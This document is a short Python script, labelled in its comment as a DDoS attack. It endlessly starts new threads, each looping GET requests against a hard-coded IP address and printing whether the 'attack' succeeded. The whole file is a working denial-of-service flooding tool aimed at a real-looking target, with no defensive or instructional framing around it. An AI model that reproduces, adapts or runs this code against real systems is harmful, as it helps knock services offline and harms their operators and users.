# DDoS Attack using Python with the requests library
import requests
import threading
import time
target = "http://178.160.229.85"

def attack():
    while True:
        try:
            response = requests.get(target)
            if response.status_code == 200:
                print(f"Attack successful at {time.time()}")
            else:
                print(f"Attack failed at {time.time()}")
        except:
            print(f"Attack failed at {time.time()}")
            pass

while True:
    thread = threading.Thread(target=attack)
    thread.start()